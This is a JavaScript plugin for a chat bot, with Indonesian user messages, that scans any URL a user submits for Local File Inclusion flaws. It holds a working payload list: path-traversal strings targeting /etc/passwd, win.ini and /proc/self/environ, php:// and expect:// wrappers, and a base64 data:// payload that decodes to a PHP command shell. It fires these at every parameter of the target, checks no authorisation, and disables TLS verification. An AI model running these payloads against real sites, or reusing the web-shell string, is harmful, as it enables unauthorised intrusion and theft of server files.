/**
 * LFI Vulnerability Checker - KYOKO MD Pentest Feature
 * Check for Local File Inclusion vulnerabilities
 * Developer: ZetaGo-Aurum
 */

const https = require('https');
const http = require('http');
const { URL } = require('url');

const pluginConfig = {
    name: 'lfi',
    alias: ['lficheck', 'lfiscan', 'pathtraversal'],
    category: 'pentest',
    description: 'Cek kerentanan Local File Inclusion',
    usage: '.lfi <url_dengan_parameter>',
    example: '.lfi https://example.com/page?file=home',
    isOwner: false,
    isPremium: true,
    isGroup: false,
    isPrivate: false,
    cooldown: 30,
    limit: 1,
    isEnabled: true
};

// LFI/Path Traversal payloads
const LFI_PAYLOADS = [
    '../../../etc/passwd',
    '....//....//....//etc/passwd',
    '..%2f..%2f..%2fetc/passwd',
    '..%252f..%252f..%252fetc/passwd',
    '/etc/passwd',
    'file:///etc/passwd',
    '../../../windows/win.ini',
    '....//....//....//windows/win.ini',
    '..\\..\\..\\windows\\win.ini',
    '/proc/self/environ',
    'php://filter/convert.base64-encode/resource=index.php',
    'php://input',
    'expect://id',
    'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4='
];

// Patterns that indicate successful LFI
const LFI_PATTERNS = [
    /root:x:0:0/i,                    // Linux /etc/passwd
    /\[fonts\]/i,                      // Windows win.ini
    /\[extensions\]/i,                 // Windows win.ini
    /HTTP_USER_AGENT/i,               // /proc/self/environ
    /DOCUMENT_ROOT/i,                 // /proc/self/environ
    /PD9waHA/,                         // Base64 PHP
    /<?php/i,                          // PHP source
    /<\?=/,                            // PHP short tag
    /\/bin\/(bash|sh)/i,              // Shell paths
    /daemon:x:/i                       // Linux users
];

function makeRequest(url, timeout = 8000) {
    return new Promise((resolve) => {
        try {
            const parsedUrl = new URL(url);
            const protocol = parsedUrl.protocol === 'https:' ? https : http;
            
            const req = protocol.get(url, {
                timeout,
                rejectUnauthorized: false,
                headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0' }
            }, (res) => {
                let data = '';
                res.on('data', chunk => data += chunk);
                res.on('end', () => resolve({ status: res.statusCode, body: data }));
            });
            
            req.on('error', () => resolve({ status: 0, error: true }));
            req.on('timeout', () => {
                req.destroy();
                resolve({ status: 0, timeout: true });
            });
        } catch (e) {
            resolve({ status: 0, error: true });
        }
    });
}

async function handler(m, { sock }) {
    const target = m.text?.trim();
    
    if (!target) {
        return m.reply(
            `üìÅ * üÍú∞…™ ·¥†·¥ú ü…¥·¥á Ä·¥Ä ô…™ ü…™·¥õ è ·¥Ñ ú·¥á·¥Ñ·¥ã·¥á Ä*\n\n` +
            `> Cek kerentanan Local File Inclusion\n\n` +
            `*Penggunaan:*\n` +
            `> ${m.prefix}lfi <url_dengan_parameter>\n\n` +
            `*Contoh:*\n` +
            `> ${m.prefix}lfi https://site.com/page?file=home\n\n` +
            `> ‚ö†Ô∏è _Parameter umum: file, page, include, path, doc_`
        );
    }
    
    let testUrl;
    try {
        testUrl = new URL(target);
        if (!testUrl.search || testUrl.search === '?') {
            return m.reply(`‚ùå URL harus memiliki parameter!\n\nContoh: \`https://site.com/page?file=home\``);
        }
    } catch {
        return m.reply(`‚ùå URL tidak valid!`);
    }
    
    await m.reply(`üìÅ * üÍú∞…™ ·¥Ñ ú·¥á·¥Ñ·¥ã·¥á Ä*\n\n‚è≥ Testing ${target}...\n> Mohon tunggu...`);
    
    try {
        const findings = [];
        const startTime = Date.now();
        const params = testUrl.searchParams;
        
        // Get baseline response
        const baseline = await makeRequest(target);
        const baselineLength = baseline.body?.length || 0;
        
        // Test each parameter
        for (const [key, value] of params) {
            for (const payload of LFI_PAYLOADS) {
                const testParams = new URLSearchParams(params);
                testParams.set(key, payload);
                
                const testUrlStr = `${testUrl.origin}${testUrl.pathname}?${testParams.toString()}`;
                const result = await makeRequest(testUrlStr, 5000);
                
                if (result.body) {
                    for (const pattern of LFI_PATTERNS) {
                        if (pattern.test(result.body)) {
                            findings.push({
                                param: key,
                                payload: payload.substring(0, 40),
                                type: 'LFI/PATH TRAVERSAL',
                                confidence: 'High'
                            });
                            break;
                        }
                    }
                    
                    // Significant difference might indicate file read
                    if (Math.abs(result.body.length - baselineLength) > 1000) {
                        const alreadyFound = findings.some(f => f.param === key && f.payload === payload.substring(0, 40));
                        if (!alreadyFound && result.body.length > baselineLength) {
                            findings.push({
                                param: key,
                                payload: payload.substring(0, 40),
                                type: 'POSSIBLE FILE READ',
                                confidence: 'Medium'
                            });
                        }
                    }
                }
                
                // Break if already found high confidence for this param
                if (findings.some(f => f.param === key && f.confidence === 'High')) {
                    break;
                }
            }
        }
        
        const scanTime = ((Date.now() - startTime) / 1000).toFixed(2);
        
        let txt = `üìÅ * üÍú∞…™ s·¥Ñ·¥Ä…¥  Ä·¥ás·¥ú ü·¥õ*\n\n`;
        txt += `üéØ Target: \`${testUrl.origin}${testUrl.pathname}\`\n`;
        txt += `üìä Params tested: ${[...params.keys()].length}\n`;
        txt += `‚è±Ô∏è Time: ${scanTime}s\n\n`;
        
        if (findings.length > 0) {
            txt += `‚ö†Ô∏è *·¥ò·¥è·¥õ·¥á…¥·¥õ…™·¥Ä ü  üÍú∞…™* (${findings.length})\n`;
            txt += `‚îÑ‚îÑ‚îÑ‚îÑ‚îÑ‚îÑ‚îÑ‚îÑ‚îÑ‚îÑ‚îÑ‚îÑ‚îÑ‚îÑ‚îÑ‚îÑ‚îÑ\n`;
            for (const f of findings) {
                txt += `  ‚ó¶ Param: \`${f.param}\`\n`;
                txt += `    Payload: ${f.payload}\n`;
                txt += `    Type: ${f.type}\n`;
                txt += `    Confidence: ${f.confidence}\n\n`;
            }
            txt += `> üö® CRITICAL: LFI dapat membaca file sensitif!`;
        } else {
            txt += `‚úÖ Tidak terdeteksi kerentanan LFI.\n`;
        }
        
        txt += `\n\n> ‚ö†Ô∏è _Scan dasar. Beberapa bypass mungkin tidak terdeteksi._`;
        
        await m.reply(txt);
        
    } catch (error) {
        await m.reply(`‚ùå Scan gagal: ${error.message}`);
    }
}

module.exports = { config: pluginConfig, handler };
